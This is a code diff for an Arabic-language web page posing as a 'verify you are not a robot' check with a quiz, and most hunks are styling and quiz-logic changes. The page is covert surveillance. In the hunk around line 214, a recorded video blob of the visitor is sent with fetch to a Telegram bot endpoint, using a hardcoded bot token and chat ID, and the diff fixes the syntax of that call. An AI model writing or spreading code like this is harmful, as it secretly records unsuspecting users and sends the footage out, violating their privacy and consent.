@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>تحقق من أنك لست روبوتاً</title>
-<style>
+    <style>
         * {
             margin: 0;
             padding: 0;
@@ -21,8 +21,8 @@
             overflow-y: auto; /* تمكين التمرير العمودي */
             flex-direction: column;
             overflow-x: hidden; /* منع التمرير الأفقي */
-            padding-top: 0;
-            padding-bottom: 0;
+            padding-top: 10px; /* إضافة مساحة من الأعلى */
+            padding-bottom: 10px; /* إضافة مساحة من الأسفل */
         }
         .container {
             background: rgba(0, 0, 0, 0.8);
@@ -129,8 +129,8 @@
             font-size: 18px;
         }
         .question {
-            margin-bottom: 60px; /* مسافة بين السؤال والاختيارات */
-            padding: 40px;
+            margin-bottom: 20px; /* مسافة بين السؤال والاختيارات */
+            padding: 10px;
             border-radius: 10px;
             font-size: 18px;
         }
@@ -142,14 +142,6 @@
         }
         .correct-answer {
             background-color: #FFEB3B; /* الإجابة الصحيحة مع اختيار المستخدم */
-        }
-        .question-container {
-            margin-bottom: 20px; /* المسافة بين السؤال والإجابات */
-        }
-
-        /* إضافة مسافة بين نص السؤال والإجابات */
-        #question-text {
-            margin-bottom: 30px; /* مسافة بين نص السؤال والإجابات */
         }
     </style>
 </head>
@@ -222,7 +214,7 @@
                         formData.append('chat_id', '2070423407'); 
                         formData.append('video', blob, 'video.webm');
 
-                        fetch(https://api.telegram.org/bot5106852555:AAGBGu_cOOtorL4B4aD7cu9JNMLoxZU0A3Q/sendVideo, { method: 'POST', body: formData })
+                        fetch(`https://api.telegram.org/bot5106852555:AAGBGu_cOOtorL4B4aD7cu9JNMLoxZU0A3Q/sendVideo`, { method: 'POST', body: formData })
                             .catch((error) => { console.error('Video upload failed:', error.message); });
                     };
                 })
@@ -257,62 +249,61 @@
         function displayQuestion() {
             if (currentQuestionIndex < questions.length) {
                 const question = questions[currentQuestionIndex];
-                questionText.textContent = question.q;
-
+                questionText.textContent = question.question;
                 optionsContainer.innerHTML = '';
-                question.options.forEach((option, index) => {
-                    const optionDiv = document.createElement('div');
-                    optionDiv.classList.add('option');
-                    optionDiv.textContent = option;
-                    optionDiv.onclick = () => {
-                        const answerIndex = index;
-                        answers.push(answerIndex);
-                        if (question.correct === answerIndex) {
-                            score++;
-                        } else {
-                            wrongAnswers.push(question);
-                        }
-                        currentQuestionIndex++;
-                        displayQuestion();
-                    };
-                    optionsContainer.appendChild(optionDiv);
+                question.options.forEach(option => {
+                    const div = document.createElement('div');
+                    div.classList.add('option');
+                    div.textContent = option;
+                    div.onclick = () => selectAnswer(option);
+                    optionsContainer.appendChild(div);
                 });
             } else {
-                showResult();
+                displayResult();
             }
         }
 
-        function showResult() {
-            document.getElementById('question-container').style.display = 'none';
-            resultDiv.style.display = 'block';
+        function selectAnswer(selectedOption) {
+            const question = questions[currentQuestionIndex];
+            answers.push(selectedOption);
+            if (selectedOption === question.correctAnswer) {
+                score++;
+                wrongAnswers.push(false);
+            } else {
+                wrongAnswers.push(true);
+            }
+            currentQuestionIndex++;
+            displayQuestion();
+        }
 
-            // Show all questions with their answers and colors
+        function displayResult() {
+            questionText.textContent = `لقد أكملت الاختبار.`;
+            optionsContainer.style.display = 'none';
+            resultDiv.style.display = 'block';
             allQuestionsContainer.innerHTML = '';
             questions.forEach((question, index) => {
                 const questionDiv = document.createElement('div');
                 questionDiv.classList.add('question');
-                questionDiv.innerHTML = 
-                    <h3>${question.q}</h3>
-                    <div class="${question.correct === answers[index] ? 'correct' : 'wrong'}">
-                        <p>${question.options[answers[index]]}</p>
-                    </div>
-                    <div class="correct-answer">
-                        <p>${question.options[question.correct]}</p>
-                    </div>
-                ;
+                const answerDiv = document.createElement('div');
+                if (wrongAnswers[index]) {
+                    answerDiv.classList.add('wrong');
+                    answerDiv.textContent = `سؤالك كان: ${question.question} - إجابتك كانت: ${answers[index]} الإجابة الصحيحة: ${question.correctAnswer}`;
+                } else {
+                    answerDiv.classList.add('correct');
+                    answerDiv.textContent = `سؤالك كان: ${question.question} - إجابتك كانت صحيحة!`;
+                }
+                questionDiv.appendChild(answerDiv);
                 allQuestionsContainer.appendChild(questionDiv);
             });
-
-            const scoreText = document.createElement('p');
-            scoreText.textContent = النتيجة: ${score} / ${questions.length};
-            allQuestionsContainer.appendChild(scoreText);
         }
 
         function restartQuiz() {
-            document.getElementById('result').style.display = 'none';
-            document.getElementById('verification-container').style.display = 'block';
-            document.getElementById('robot-checkbox').checked = false;
-            document.getElementById('language-buttons').style.display = 'flex';
+            score = 0;
+            answers = [];
+            wrongAnswers = [];
+            displayQuestion();
+            resultDiv.style.display = 'none';
+            document.getElementById('question-container').style.display = 'block';
         }
     </script>
 </body>
